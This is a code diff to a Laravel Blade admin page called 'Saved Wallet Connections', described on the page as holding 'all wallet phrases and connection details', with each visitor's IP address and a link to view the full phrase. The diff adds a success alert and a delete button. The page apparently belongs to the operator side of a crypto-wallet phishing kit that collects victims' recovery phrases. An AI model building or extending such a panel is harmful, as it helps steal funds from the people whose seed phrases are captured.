@@ -4,6 +4,12 @@
 <div class="container mt-5">
     <div class="row mb-4">
         <div class="col-12">
+            @if(session('success'))
+                <div class="alert alert-success alert-dismissible fade show" role="alert">
+                    <i class="fa fa-check-circle"></i> {{ session('success') }}
+                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                </div>
+            @endif
             <h1 class="mb-1">Saved Wallet Connections</h1>
             <p class="text-muted">All wallet phrases and connection details</p>
             <hr>
@@ -42,10 +48,22 @@
                                         <code>{{ $connection->ip_address ?? 'N/A' }}</code>
                                     </td>
                                     <td>
-                                        <a href="{{ route('admin.wallet-connections.show', $connection->id) }}" 
-                                           class="btn btn-sm btn-info text-white">
-                                            <i class="fa fa-eye"></i> View Full Phrase
-                                        </a>
+                                        <div class="d-flex gap-2">
+                                            <a href="{{ route('admin.wallet-connections.show', $connection->id) }}" 
+                                               class="btn btn-sm btn-info text-white">
+                                                <i class="fa fa-eye"></i> View
+                                            </a>
+                                            <form action="{{ route('admin.wallet-connections.delete', $connection->id) }}" 
+                                                  method="POST" 
+                                                  style="display:inline;"
+                                                  onsubmit="return confirm('Are you sure you want to delete this wallet connection? This action cannot be undone.');">
+                                                @csrf
+                                                @method('DELETE')
+                                                <button type="submit" class="btn btn-sm btn-danger text-white">
+                                                    <i class="fa fa-trash"></i> Delete
+                                                </button>
+                                            </form>
+                                        </div>
                                     </td>
                                 </tr>
                             @endforeach
